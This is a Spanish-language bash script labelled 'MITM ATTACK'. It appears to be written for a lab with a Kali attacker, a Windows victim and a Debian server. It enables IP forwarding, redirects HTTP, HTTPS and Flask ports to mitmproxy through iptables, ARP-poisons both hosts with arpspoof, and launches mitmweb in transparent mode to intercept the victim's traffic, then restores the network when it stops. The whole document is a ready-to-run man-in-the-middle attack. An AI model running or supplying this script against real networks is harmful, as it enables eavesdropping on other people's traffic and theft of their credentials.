# ─── CONFIGURA ESTAS IPs ───────────────────────────────
IP_VICTIMA="192.168.0.11"      # Windows
IP_SERVIDOR="192.168.0.8"    # Debian (SSA)
INTERFAZ="eth0"               
# ───────────────────────────────────────────────────────

RED='\033[91m'
GREEN='\033[92m'
CYAN='\033[96m'
YELLOW='\033[93m'
BOLD='\033[1m'
RESET='\033[0m'

# Verificar root
if [ "$EUID" -ne 0 ]; then
  echo -e "\n${RED}Ejecuta con sudo: sudo bash mitm_attack.sh${RESET}\n"
  exit 1
fi

# Verificar herramientas
for tool in arpspoof mitmweb iptables; do
  if ! command -v $tool &>/dev/null; then
    echo -e "${RED}Falta: $tool${RESET}"
    echo "Instalar con: sudo apt install dsniff mitmproxy -y"
    exit 1
  fi
done

echo ""
echo -e "${BOLD}${RED}╔══════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${RED}║                      MITM ATTACK             ║${RESET}"
echo -e "${BOLD}${RED}╚══════════════════════════════════════════════╝${RESET}"
echo -e "  ${CYAN}Víctima  (Windows):  ${RESET}${IP_VICTIMA}"
echo -e "  ${CYAN}Servidor (Debian):   ${RESET}${IP_SERVIDOR}"
echo -e "  ${CYAN}Interfaz:            ${RESET}${INTERFAZ}"
echo -e "  ${CYAN}Atacante (Kali):     ${RESET}$(hostname -I | awk '{print $1}')"
echo ""

# ── Paso 1: Habilitar IP forwarding ──────────────────
echo -e "${GREEN}[1/4] Habilitando IP forwarding...${RESET}"
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "  ${GREEN}✓ Tráfico se reenvía entre víctima y servidor${RESET}"

# ── Paso 2: Redirigir tráfico HTTP/HTTPS a mitmproxy ─
echo -e "\n${GREEN}[2/4] Configurando iptables...${RESET}"
# Limpiar reglas previas
iptables -t nat -F PREROUTING 2>/dev/null

# Redirigir puerto 80 (HTTP) y 5000 (Flask) al proxy
iptables -t nat -A PREROUTING -i $INTERFAZ -p tcp --dport 80   -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $INTERFAZ -p tcp --dport 5000 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $INTERFAZ -p tcp --dport 443  -j REDIRECT --to-port 8080
echo -e "  ${GREEN}✓ Puertos 80, 443 y 5000 redirigidos a mitmproxy (8080)${RESET}"

# ── Paso 3: ARP Poisoning en segundo plano ───────────
echo -e "\n${GREEN}[3/4] Iniciando ARP Poisoning...${RESET}"
echo -e "  Le decimos a Windows que somos Debian..."
arpspoof -i $INTERFAZ -t $IP_VICTIMA $IP_SERVIDOR > /dev/null 2>&1 &
PID_ARP1=$!

echo -e "  Le decimos a Debian que somos Windows..."
arpspoof -i $INTERFAZ -t $IP_SERVIDOR $IP_VICTIMA > /dev/null 2>&1 &
PID_ARP2=$!

echo -e "  ${GREEN}✓ ARP Poisoning activo (PIDs: $PID_ARP1 $PID_ARP2)${RESET}"

# ── Paso 4: Levantar mitmweb ─────────────────────────
echo -e "\n${GREEN}[4/4] Levantando mitmweb...${RESET}"
echo ""
echo -e "${BOLD}═══════════════════════════════════════════════${RESET}"
echo -e "  ${RED}INTERCEPTANDO TRÁFICO${RESET}"
echo -e "  Interfaz visual: ${CYAN}http://127.0.0.1:8081${RESET}"
echo -e "  Abre esa URL en el navegador de Kali"
echo -e "${BOLD}═══════════════════════════════════════════════${RESET}"
echo -e "  Presiona ${YELLOW}Ctrl+C${RESET} para detener todo"
echo ""

# Función de limpieza al salir
limpiar() {
  echo -e "\n\n${YELLOW}Deteniendo ataque y restaurando red...${RESET}"
  kill $PID_ARP1 $PID_ARP2 2>/dev/null
  iptables -t nat -F PREROUTING
  echo 0 > /proc/sys/net/ipv4/ip_forward
  echo -e "${GREEN}✓ Red restaurada. ARP normal.${RESET}\n"
  exit 0
}
trap limpiar SIGINT SIGTERM

# Levantar mitmweb en modo transparente
mitmweb --mode transparent \
        --listen-host 0.0.0.0 \
        --listen-port 8080 \
        --web-host 127.0.0.1 \
        --web-port 8081

limpiar
